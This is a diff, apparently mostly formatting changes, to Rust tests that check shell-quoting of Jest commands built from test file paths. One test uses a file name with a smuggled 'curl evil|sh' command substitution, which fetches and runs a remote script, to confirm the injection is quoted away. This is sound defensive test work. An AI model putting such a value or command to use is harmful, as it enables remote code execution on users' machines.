@@ -1486,10 +1486,8 @@ mod tests {
         // Linux and must not become a code-exec vector when an agent runs the
         // suggested command verbatim.
         let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
-        let result = verify_command_for_discovery(
-            &discovery,
-            Path::new("tests/x$(curl evil|sh).test.ts"),
-        );
+        let result =
+            verify_command_for_discovery(&discovery, Path::new("tests/x$(curl evil|sh).test.ts"));
         assert_eq!(
             result,
             Some("jest 'tests/x$(curl evil|sh).test.ts'".to_string()),
@@ -1500,19 +1498,14 @@ mod tests {
     #[test]
     fn verify_command_filename_with_space_is_shell_quoted() {
         let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
-        let result =
-            verify_command_for_discovery(&discovery, Path::new("tests/my file.test.ts"));
-        assert_eq!(
-            result,
-            Some("jest 'tests/my file.test.ts'".to_string())
-        );
+        let result = verify_command_for_discovery(&discovery, Path::new("tests/my file.test.ts"));
+        assert_eq!(result, Some("jest 'tests/my file.test.ts'".to_string()));
     }
 
     #[test]
     fn verify_command_filename_with_single_quote_is_escaped() {
         let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
-        let result =
-            verify_command_for_discovery(&discovery, Path::new("tests/o'brien.test.ts"));
+        let result = verify_command_for_discovery(&discovery, Path::new("tests/o'brien.test.ts"));
         assert_eq!(
             result,
             Some("jest 'tests/o'\\''brien.test.ts'".to_string()),
